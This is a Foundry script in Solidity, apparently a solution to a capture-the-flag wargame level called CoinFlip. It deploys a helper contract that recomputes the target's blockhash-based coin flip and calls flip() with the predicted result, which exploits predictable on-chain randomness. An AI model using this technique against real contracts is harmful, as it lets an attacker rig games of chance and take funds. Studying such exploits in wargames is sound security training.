// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {CoinFlip} from "../../src/CoinFlip/CoinFlip.sol";
import {Script} from "../../lib/forge-std/src/Script.sol";
import {console} from "../../lib/forge-std/src/console.sol";

contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinFlipInstance = CoinFlip(0x5fcF0BD693C599e3BC08eEDc663b8ef6f8a70103);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinFlipInstance);
        console.log("ConsecutiveWins: ", coinFlipInstance.consecutiveWins());
        vm.stopBroadcast();
    }
}
